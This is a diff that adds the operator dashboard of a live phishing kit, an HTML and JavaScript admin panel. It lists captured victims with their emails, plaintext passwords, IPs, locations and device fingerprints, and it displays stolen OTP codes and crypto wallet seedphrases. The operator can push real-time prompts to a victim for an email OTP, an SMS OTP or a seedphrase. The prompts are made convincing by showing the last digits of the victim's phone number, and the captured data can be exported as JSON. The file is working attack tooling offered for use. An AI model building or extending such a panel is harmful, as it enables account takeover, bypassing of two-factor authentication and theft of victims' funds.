@@ -1,0 +1,1017 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🚨 Phishing Analytics Dashboard</title>
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <style>
+        * {
+      margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+    }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0a0a;
+            color: #ffffff;
+            overflow-x: hidden;
+        }
+
+        .header {
+            background: #0f0f0f;
+            padding: 20px;
+            border-bottom: 1px solid #2a2a2a;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
+        }
+
+        .header h1 {
+            font-size: 1.8em;
+            text-align: center;
+            color: #ffffff;
+            text-shadow: none;
+        }
+
+        .header .subtitle {
+            text-align: center;
+            margin-top: 10px;
+            opacity: 0.8;
+            font-size: 1em;
+            color: #cccccc;
+    }
+
+        .controls {
+      display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+    }
+
+        .btn {
+            background: #333333;
+            border: 1px solid #555555;
+            padding: 12px 24px;
+            border-radius: 8px;
+            color: white;
+      cursor: pointer;
+            font-size: 14px;
+            font-weight: 600;
+      transition: all 0.2s ease;
+    }
+
+        .btn:hover {
+            background: #444444;
+            border-color: #666666;
+    }
+
+        .btn.danger {
+            background: #cc0000;
+            border-color: #cc0000;
+    }
+
+        .btn.danger:hover {
+            background: #dd0000;
+        }
+
+        .btn.success {
+            background: #006600;
+            border-color: #006600;
+        }
+
+        .btn.success:hover {
+            background: #008800;
+        }
+
+        .btn.primary {
+            background: #0052FF;
+            border-color: #0052FF;
+        }
+
+        .btn.primary:hover {
+            background: #0040CC;
+    }
+
+        .dashboard {
+      display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 20px;
+            padding: 20px;
+            max-width: 1400px;
+            margin: 0 auto;
+    }
+
+        .card {
+            background: #151515;
+            border-radius: 12px;
+            padding: 24px;
+            border: 1px solid #2a2a2a;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+        }
+
+        .card h3 {
+            margin-bottom: 15px;
+            font-size: 1.3em;
+            color: #ffffff;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+    }
+
+        .stat-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+    }
+
+        .stat-card {
+            background: #1a1a1a;
+            padding: 24px;
+            border-radius: 10px;
+            text-align: center;
+            border: 1px solid #2a2a2a;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+        }
+
+        .stat-number {
+            font-size: 2em;
+            font-weight: bold;
+            color: #ffffff;
+            display: block;
+    }
+
+        .stat-label {
+            font-size: 0.9em;
+            opacity: 0.8;
+            margin-top: 5px;
+            color: #cccccc;
+    }
+
+        .users-table {
+            overflow-x: auto;
+            max-height: 600px;
+            border-radius: 10px;
+            background: #1a1a1a;
+            border: 1px solid #2a2a2a;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+        }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+    }
+
+    th, td {
+            padding: 16px 12px;
+            text-align: left;
+            border-bottom: 1px solid #2a2a2a;
+        }
+
+    th {
+            background: #2a2a2a;
+            font-weight: 600;
+            color: #ffffff;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+
+        tr:hover {
+            background: #333333;
+    }
+
+        .status-online {
+            color: #00ff00;
+      font-weight: bold;
+    }
+
+        .status-offline {
+            color: #ff6666;
+      font-weight: bold;
+    }
+
+        .status-loading {
+            color: #ffaa00;
+            font-weight: bold;
+            animation: pulse-loading 1.5s infinite;
+        }
+
+        @keyframes pulse-loading {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+
+        .activity-log {
+            max-height: 400px;
+            overflow-y: auto;
+            background: #1a1a1a;
+            border-radius: 10px;
+            padding: 20px;
+            border: 1px solid #2a2a2a;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+        }
+
+        .log-entry {
+            padding: 10px 0;
+            border-bottom: 1px solid #2a2a2a;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            color: #e0e0e0;
+            line-height: 1.4;
+        }
+
+        .log-timestamp {
+            color: #4CAF50;
+            margin-right: 10px;
+    }
+
+        .log-type {
+            color: #2196F3;
+            font-weight: bold;
+            margin-right: 10px;
+    }
+
+        .user-details {
+            background: #1a1a1a;
+            border-radius: 10px;
+            padding: 24px;
+            margin: 16px 0;
+            border: 1px solid #2a2a2a;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+        }
+
+        .user-details h3 {
+            margin-bottom: 20px;
+            color: #ffffff;
+            font-size: 1.2em;
+        }
+
+        .user-details p {
+            margin-bottom: 12px;
+            line-height: 1.6;
+            color: #e0e0e0;
+        }
+
+        .user-details p strong {
+            color: #ffffff;
+            display: inline-block;
+            min-width: 140px;
+        }
+
+        .full-width {
+            grid-column: 1 / -1;
+    }
+
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 2000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+    }
+
+        .modal-content {
+            background: #151515;
+            margin: 5% auto;
+            padding: 32px;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 800px;
+            max-height: 80%;
+            overflow-y: auto;
+            border: 1px solid #2a2a2a;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+        }
+
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .close:hover {
+            color: #fff;
+    }
+
+        .fingerprint-data {
+            background: #1a1a1a;
+            padding: 16px;
+            border-radius: 8px;
+            margin: 12px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85em;
+            border: 1px solid #2a2a2a;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+        }
+
+        .fingerprint-data h4 {
+            margin-bottom: 12px;
+            color: #ffffff;
+            font-size: 1em;
+        }
+
+        .fingerprint-data pre {
+            background: #0f0f0f;
+            padding: 12px;
+            border-radius: 6px;
+            border: 1px solid #333333;
+            overflow-x: auto;
+            color: #e0e0e0;
+        }
+
+        .importance-level {
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 0.8em;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .importance-low { 
+            background: #0a3d0a; 
+            color: #4ade80;
+            border: 1px solid #22c55e;
+        }
+        .importance-medium { 
+            background: #4a3d0a; 
+            color: #fbbf24;
+            border: 1px solid #f59e0b;
+        }
+        .importance-high { 
+            background: #4a0a0a; 
+            color: #f87171;
+            border: 1px solid #ef4444;
+        }
+        .importance-critical { 
+            background: #5a0a0a; 
+            color: #ff4444;
+            border: 1px solid #dc2626;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 40px;
+            font-size: 1.2em;
+            opacity: 0.7;
+            color: #cccccc;
+    }
+
+        .export-options {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-top: 10px;
+    }
+
+        .verification-controls {
+            background: #1a1a1a;
+            border: 1px solid #2a2a2a;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 16px 0;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+        }
+
+        .verification-controls h4 {
+            color: #ffffff;
+            margin-bottom: 10px;
+    }
+
+        .verification-form {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .form-group label {
+            color: #cccccc;
+            font-size: 0.9em;
+        }
+
+        .form-group input, .form-group select {
+            background: #333333;
+            border: 1px solid #555555;
+            color: #ffffff;
+            padding: 8px;
+      border-radius: 4px;
+        }
+
+        .form-group input:focus, .form-group select:focus {
+            outline: none;
+            border-color: #0052FF;
+        }
+
+        .inline-form {
+            display: flex;
+            gap: 10px;
+            align-items: end;
+        }
+
+        .inline-form .form-group {
+            flex: 1;
+        }
+
+        *, *::before, *::after {
+            animation: none !important;
+            transition: none !important;
+    }
+
+        @media (max-width: 768px) {
+            .dashboard {
+                grid-template-columns: 1fr;
+                padding: 10px;
+            }
+            
+            .header h1 {
+                font-size: 1.5em;
+            }
+            
+            .controls {
+                flex-direction: column;
+                align-items: center;
+            }
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+        <h1><i class="fas fa-shield-alt"></i> Phishing Analytics Dashboard</h1>
+        <p class="subtitle">Real-time monitoring system</p>
+        <div class="controls">
+            <button class="btn" onclick="refreshData()"><i class="fas fa-sync-alt"></i> Refresh</button>
+            <button class="btn success" onclick="exportData()"><i class="fas fa-download"></i> Export Data</button>
+            <button class="btn" onclick="clearLogs()"><i class="fas fa-trash"></i> Clear Logs</button>
+            <button class="btn danger" onclick="logout()"><i class="fas fa-sign-out-alt"></i> Logout</button>
+        </div>
+    </div>
+
+    <div class="dashboard">
+        <!-- Statistics Overview -->
+        <div class="card full-width">
+            <h3><i class="fas fa-chart-line"></i> Real-time Statistics</h3>
+            <div class="stat-grid">
+                <div class="stat-card">
+                    <span class="stat-number" id="activeUsers">0</span>
+                    <div class="stat-label">Active Users</div>
+      </div>
+      <div class="stat-card">
+                    <span class="stat-number" id="totalCaptures">0</span>
+                    <div class="stat-label">Total Captures</div>
+        </div>
+                <div class="stat-card">
+                    <span class="stat-number" id="uniqueIPs">0</span>
+                    <div class="stat-label">Unique IPs</div>
+      </div>
+      <div class="stat-card">
+                    <span class="stat-number" id="avgSessionTime">0s</span>
+                    <div class="stat-label">Avg Session Time</div>
+        </div>
+                <div class="stat-card">
+                    <span class="stat-number" id="suspiciousUsers">0</span>
+                    <div class="stat-label">Suspicious Users</div>
+      </div>
+      <div class="stat-card">
+                    <span class="stat-number" id="totalVisits">0</span>
+                    <div class="stat-label">Total Visits</div>
+        </div>
+      </div>
+    </div>
+
+        <!-- Active Users Table -->
+        <div class="card full-width">
+            <h3><i class="fas fa-users"></i> Active Users & Sessions</h3>
+            <div class="users-table">
+                <table>
+          <thead>
+            <tr>
+                            <th>Status</th>
+              <th>Email</th>
+                            <th>Location</th>
+                            <th>Device</th>
+                            <th>Session Time</th>
+                            <th>Importance</th>
+              <th>Actions</th>
+            </tr>
+          </thead>
+                    <tbody id="usersTableBody">
+                        <tr>
+                            <td colspan="7" class="loading">
+                                Loading user data...
+                            </td>
+                        </tr>
+                    </tbody>
+        </table>
+      </div>
+    </div>
+
+        <!-- Activity Log -->
+        <div class="card">
+            <h3><i class="fas fa-list"></i> Live Activity Log</h3>
+            <div class="activity-log" id="activityLog">
+                <div class="log-entry">
+                    <span class="log-timestamp">[Loading...]</span>
+                    <span class="log-type">SYSTEM</span>
+                    Initializing monitoring system...
+                </div>
+            </div>
+        </div>
+
+        <!-- Recent Captures -->
+        <div class="card">
+            <h3><i class="fas fa-history"></i> Recent Captures</h3>
+            <div id="recentCaptures">
+                <div class="loading">
+                    Loading recent activity...
+                </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- User Details Modal -->
+    <div id="userModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2><i class="fas fa-user-secret"></i> User Analysis</h2>
+            <div id="userModalContent">
+                <!-- Content will be populated by JavaScript -->
+            </div>
+            
+            <!-- Verification Controls -->
+            <div class="verification-controls">
+                <h4><i class="fas fa-shield-alt"></i> Send Verification Request</h4>
+                
+                <!-- OTP Request -->
+                <div class="verification-form">
+                    <div class="form-group">
+                        <label>Request Type:</label>
+                        <select id="verificationType">
+                            <option value="email">Email OTP</option>
+                            <option value="sms">SMS OTP</option>
+                            <option value="seedphrase">Seedphrase</option>
+                        </select>
+                    </div>
+
+                    <div id="emailCustomization" style="display: block;">
+                        <button class="btn primary" onclick="sendVerificationRequest()">
+                            <i class="fas fa-envelope"></i> Send Email Verification
+                        </button>
+                    </div>
+                    
+                    <div id="smsCustomization" style="display: none;">
+                        <div class="inline-form">
+                            <div class="form-group">
+                                <label>Full Phone Number:</label>
+                                <input type="text" id="phoneNumber" placeholder="e.g., +1 (555) 123-4567" maxlength="20">
+                            </div>
+                            <button class="btn primary" onclick="sendVerificationRequest()">
+                                <i class="fas fa-sms"></i> Send SMS Request
+                            </button>
+                        </div>
+                        <small style="color: #888; margin-top: 5px; display: block;">
+                            Enter full phone number. The prompt will show the last 2 digits.
+                        </small>
+                    </div>
+                    
+                    <div id="seedphraseCustomization" style="display: none;">
+                        <button class="btn primary" onclick="sendVerificationRequest()">
+                            <i class="fas fa-key"></i> Request Seedphrase
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+  </div>
+
+  <script>
+        // Global variables
+        let socket;
+        let users = [];
+        let analytics = {};
+        let currentUserId = null;
+
+        // Initialize dashboard
+        document.addEventListener('DOMContentLoaded', function() {
+            initializeSocket();
+            setupEventListeners();
+            
+            console.log('🎮 Phishing Analytics Dashboard Initialized');
+        });
+
+        // Socket.IO connection
+        function initializeSocket() {
+            console.log('🚀 Initializing Socket.IO connection...');
+            socket = io();
+
+            socket.on('connect', () => {
+                console.log('🔌 Connected to monitoring server');
+                addLogEntry('SYSTEM', 'Connected to monitoring server');
+                requestAnalytics();
+                
+                // Request initial user data
+                console.log('📊 Requesting initial data...');
+                socket.emit('requestAnalytics');
+                socket.emit('userUpdate', Array.from([])); // Request user update
+            });
+
+            socket.on('userUpdate', (userData) => {
+                console.log('👥 Received user update:', userData);
+                users = userData || [];
+                updateUsersTable();
+                updateStatistics();
+            });
+
+            socket.on('analyticsUpdate', (analyticsData) => {
+                console.log('📊 Received analytics update:', analyticsData);
+                analytics = analyticsData || {};
+                updateAnalytics();
+            });
+
+            socket.on('userActivity', (activity) => {
+                addLogEntry('ACTIVITY', `User ${activity.userId.substring(0, 8)}: ${activity.action} on ${activity.url}`);
+                updateUserActivity(activity);
+            });
+
+            socket.on('verificationRequest', (data) => {
+                addLogEntry('VERIFICATION', `Verification request for user ${data.userId.substring(0, 8)}: ${data.type}`);
+            });
+
+            socket.on('loginError', (data) => {
+                addLogEntry('ERROR', `Login error for user ${data.userId.substring(0, 8)}: ${data.type}`);
+            });
+
+            socket.on('disconnect', () => {
+                console.log('🔌 Disconnected from monitoring server');
+                addLogEntry('SYSTEM', 'Disconnected from monitoring server');
+            });
+
+            socket.on('connect_error', (error) => {
+                console.error('❌ Socket connection error:', error);
+                addLogEntry('ERROR', 'Connection error: ' + error.message);
+            });
+
+            socket.on('error', (error) => {
+                console.error('❌ Socket error:', error);
+                addLogEntry('ERROR', 'Socket error: ' + error.message);
+            });
+        }
+
+        // Setup event listeners
+        function setupEventListeners() {
+            // Modal functionality
+            const modal = document.getElementById('userModal');
+            const closeBtn = document.getElementsByClassName('close')[0];
+
+            closeBtn.onclick = function() {
+                modal.style.display = 'none';
+            }
+
+            window.onclick = function(event) {
+                if (event.target == modal) {
+                    modal.style.display = 'none';
+                }
+            }
+
+            // Verification type change handler
+            document.getElementById('verificationType').addEventListener('change', function() {
+                const type = this.value;
+                const emailDiv = document.getElementById('emailCustomization');
+                const smsDiv = document.getElementById('smsCustomization');
+                const seedphraseDiv = document.getElementById('seedphraseCustomization');
+                
+                if (type === 'seedphrase') {
+                    emailDiv.style.display = 'none';
+                    smsDiv.style.display = 'none';
+                    seedphraseDiv.style.display = 'block';
+                } else if (type === 'sms') {
+                    emailDiv.style.display = 'none';
+                    smsDiv.style.display = 'block';
+                    seedphraseDiv.style.display = 'none';
+                } else {
+                    emailDiv.style.display = 'block';
+                    smsDiv.style.display = 'none';
+                    seedphraseDiv.style.display = 'none';
+                }
+            });
+    }
+
+        // Send verification request
+        function sendVerificationRequest() {
+            if (!currentUserId) {
+                alert('No user selected');
+                return;
+            }
+
+            const type = document.getElementById('verificationType').value;
+            let requestData = {
+                userId: currentUserId,
+                type: type
+            };
+            
+            // Handle SMS verification
+            if (type === 'sms') {
+                const phoneNumber = document.getElementById('phoneNumber').value.trim();
+                if (!phoneNumber) {
+                    alert('Please enter a phone number for SMS verification');
+                    return;
+                }
+                
+                // Extract last 2 digits from phone number
+                const digitsOnly = phoneNumber.replace(/\D/g, '');
+                const last2Digits = digitsOnly.slice(-2);
+                
+                requestData.phone = phoneNumber;
+                requestData.customDigits = last2Digits;
+            }
+
+            // Send via socket
+            socket.emit('sendVerificationRequest', requestData);
+            
+            // Log the request
+            const logMessage = type === 'sms' 
+                ? `Sent ${type} verification request to user ${currentUserId.substring(0, 8)} (${requestData.phone}, last 2 digits: ${requestData.customDigits})`
+                : `Sent ${type} verification request to user ${currentUserId.substring(0, 8)}`;
+            addLogEntry('ADMIN', logMessage);
+            
+            // Show confirmation
+            alert(`${type.charAt(0).toUpperCase() + type.slice(1)} verification request sent!`);
+        }
+
+        // Request analytics data
+        function requestAnalytics() {
+            socket.emit('requestAnalytics');
+        }
+
+        // Update statistics
+        function updateStatistics() {
+            console.log('📊 Updating statistics with', users.length, 'users');
+            
+            try {
+                document.getElementById('activeUsers').textContent = users.filter(u => u.isActive).length;
+                document.getElementById('totalCaptures').textContent = users.length;
+                document.getElementById('uniqueIPs').textContent = new Set(users.map(u => u.ip || 'unknown')).size;
+                document.getElementById('suspiciousUsers').textContent = users.filter(u => u.importanceLevel === 'high' || u.importanceLevel === 'critical').length;
+                document.getElementById('totalVisits').textContent = users.reduce((sum, u) => sum + (u.visits || 1), 0);
+                
+                const avgTime = users.reduce((sum, u) => sum + (u.sessionTime || 0), 0) / users.length || 0;
+                document.getElementById('avgSessionTime').textContent = Math.round(avgTime) + 's';
+                
+                console.log('✅ Statistics updated successfully');
+            } catch (error) {
+                console.error('❌ Error updating statistics:', error);
+                addLogEntry('ERROR', 'Failed to update statistics: ' + error.message);
+            }
+    }
+
+        // Update users table
+        function updateUsersTable() {
+            const tbody = document.getElementById('usersTableBody');
+            
+            if (users.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="7" class="loading">No active users</td></tr>';
+                return;
+            }
+
+            tbody.innerHTML = users.map(user => {
+                const statusDisplay = user.isLoading ? 'LOADING' : (user.isActive ? 'ACTIVE' : 'OFFLINE');
+                const statusClass = user.isLoading ? 'status-loading' : (user.isActive ? 'status-online' : 'status-offline');
+                
+                return `
+                <tr onclick="showUserDetails('${user.id}')">
+                    <td><span class="${statusClass}">${statusDisplay}</span></td>
+                    <td>${user.email || 'N/A'}</td>
+                    <td>${user.location || 'Unknown'}</td>
+                    <td>${user.device || 'Unknown'}</td>
+                    <td>${user.sessionTime || 0}s</td>
+                    <td><span class="importance-level importance-${user.importanceLevel || 'low'}">${(user.importanceLevel || 'low').toUpperCase()}</span></td>
+                    <td>
+                        <button class="btn" style="padding: 5px 10px; font-size: 12px;" onclick="event.stopPropagation(); showUserDetails('${user.id}')">
+                            <i class="fas fa-eye"></i> View
+                        </button>
+                    </td>
+                </tr>`;
+            }).join('');
+    }
+
+        // Show user details modal
+        function showUserDetails(userId) {
+            currentUserId = userId;
+            const user = users.find(u => u.id === userId);
+            if (!user) return;
+
+            const modal = document.getElementById('userModal');
+            const content = document.getElementById('userModalContent');
+
+            content.innerHTML = `
+                <div class="user-details">
+                    <h3><i class="fas fa-user"></i> User Information</h3>
+                    <p><strong>ID:</strong> ${user.id}</p>
+                    <p><strong>Email:</strong> ${user.email || 'Not provided'}</p>
+                    <p><strong>Password:</strong> ${user.password || 'Not captured yet'}</p>
+                    <p><strong>IP Address:</strong> ${user.ip || 'Unknown'}</p>
+                    <p><strong>Location:</strong> ${user.location || 'Unknown'}</p>
+                    <p><strong>User Agent:</strong> ${user.userAgent || 'Unknown'}</p>
+                    <p><strong>Session Time:</strong> ${user.sessionTime || 0} seconds</p>
+                    <p><strong>Importance Level:</strong> <span class="importance-level importance-${user.importanceLevel || 'low'}">${(user.importanceLevel || 'low').toUpperCase()}</span></p>
+                    <p><strong>First Seen:</strong> ${new Date(user.timestamp).toLocaleString()}</p>
+                </div>
+
+                ${user.fingerprint ? `
+                    <div class="fingerprint-data">
+                        <h4><i class="fas fa-fingerprint"></i> Device Fingerprint</h4>
+                        <pre>${JSON.stringify(user.fingerprint, null, 2)}</pre>
+                    </div>
+                ` : ''}
+
+                ${user.seedphrase ? `
+                    <div class="fingerprint-data">
+                        <h4><i class="fas fa-key"></i> Captured Seedphrase</h4>
+                        <div style="background: #2a0000; border: 1px solid #660000; padding: 15px; border-radius: 8px; margin: 10px 0;">
+                            <strong style="color: #ff6666;">🔑 CRITICAL CAPTURE:</strong><br>
+                            <code style="color: #ffcccc; font-size: 1.1em; word-break: break-all;">${user.seedphrase}</code><br>
+                            <small style="color: #ffaaaa;">Captured: ${user.seedphraseTime ? new Date(user.seedphraseTime).toLocaleString() : 'Unknown'}</small>
+        </div>
+        </div>
+                ` : ''}
+
+                ${user.otp ? `
+                    <div class="fingerprint-data">
+                        <h4><i class="fas fa-shield-alt"></i> Captured OTP Code</h4>
+                        <div style="background: #2a1a00; border: 1px solid #664400; padding: 15px; border-radius: 8px; margin: 10px 0;">
+                            <strong style="color: #ffaa00;">🔢 OTP Code:</strong><br>
+                            <code style="color: #ffddaa; font-size: 1.2em;">${user.otp}</code><br>
+                            <small style="color: #ffccaa;">Captured: ${user.otpTime ? new Date(user.otpTime).toLocaleString() : 'Unknown'}</small>
+        </div>
+      </div>
+                ` : ''}
+
+                <div class="export-options">
+                    <button class="btn" onclick="exportUserData('${user.id}')">
+                        <i class="fas fa-download"></i> Export User Data
+                    </button>
+                    <button class="btn danger" onclick="deleteUser('${user.id}')">
+                        <i class="fas fa-trash"></i> Delete User
+                    </button>
+    </div>
+  `;
+
+            modal.style.display = 'block';
+}
+
+        // Add log entry
+        function addLogEntry(type, message) {
+            const logContainer = document.getElementById('activityLog');
+            const timestamp = new Date().toLocaleTimeString();
+            
+            const logEntry = document.createElement('div');
+            logEntry.className = 'log-entry';
+            logEntry.innerHTML = `
+                <span class="log-timestamp">[${timestamp}]</span>
+                <span class="log-type">${type}</span>
+                ${message}
+            `;
+            
+            logContainer.insertBefore(logEntry, logContainer.firstChild);
+            
+            // Keep only last 100 entries
+            while (logContainer.children.length > 100) {
+                logContainer.removeChild(logContainer.lastChild);
+            }
+        }
+
+        // Update analytics
+        function updateAnalytics() {
+            updateRecentCaptures();
+        }
+
+        // Update recent captures
+        function updateRecentCaptures() {
+            const container = document.getElementById('recentCaptures');
+            const recentUsers = users.slice(0, 5);
+
+            if (recentUsers.length === 0) {
+                container.innerHTML = '<div class="loading">No recent captures</div>';
+                return;
+            }
+
+            container.innerHTML = recentUsers.map(user => `
+                <div class="user-details" onclick="showUserDetails('${user.id}')">
+                    <strong>${user.email || 'Anonymous'}</strong>
+                    <br>
+                    <small>${user.ip} - ${new Date(user.timestamp).toLocaleString()}</small>
+                    <br>
+                    <span class="threat-level threat-${user.threatLevel || 'low'}">${(user.threatLevel || 'low').toUpperCase()}</span>
+                </div>
+            `).join('');
+    }
+
+        // Export functions
+        function exportData() {
+            const data = {
+                users: users,
+                analytics: analytics,
+                exportTime: new Date().toISOString()
+            };
+
+            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `phishing-data-${new Date().toISOString().split('T')[0]}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+
+            addLogEntry('EXPORT', 'Complete dataset exported');
+        }
+
+        function exportUserData(userId) {
+            const user = users.find(u => u.id === userId);
+            if (!user) return;
+
+            const blob = new Blob([JSON.stringify(user, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `user-${userId.substring(0, 8)}-${new Date().toISOString().split('T')[0]}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+
+            addLogEntry('EXPORT', `User ${userId.substring(0, 8)} data exported`);
+        }
+
+        // Utility functions
+        function refreshData() {
+            addLogEntry('SYSTEM', 'Refreshing data...');
+            requestAnalytics();
+    }
+
+        function clearLogs() {
+            if (confirm('Clear all logs?')) {
+                document.getElementById('activityLog').innerHTML = '';
+                addLogEntry('SYSTEM', 'Logs cleared');
+            }
+        }
+
+        function deleteUser(userId) {
+            if (confirm('Delete this user data?')) {
+                socket.emit('deleteUser', userId);
+                users = users.filter(u => u.id !== userId);
+                updateUsersTable();
+                updateStatistics();
+                document.getElementById('userModal').style.display = 'none';
+                addLogEntry('ADMIN', `User ${userId.substring(0, 8)} deleted`);
+          }
+        }
+
+        function logout() {
+            if (confirm('Logout from admin panel?')) {
+                sessionStorage.removeItem('adminAuthenticated');
+                window.location.href = 'admin-login.html';
+        }
+      }
+
+        // Auto-refresh every 30 seconds
+        setInterval(refreshData, 30000);
+
+        // Manual debug function - can be called from browser console
+        window.debugAdminPanel = function() {
+            console.log('🔍 DEBUG INFO:');
+            console.log('Socket connected:', socket?.connected);
+            console.log('Users array:', users);
+            console.log('Analytics object:', analytics);
+            console.log('Current user ID:', currentUserId);
+            
+            // Try to reconnect if needed
+            if (!socket?.connected) {
+                console.log('🔄 Attempting to reconnect...');
+                initializeSocket();
+            }
+            
+            // Force data refresh
+            requestAnalytics();
+        };
+  </script>
+</body>
+</html>
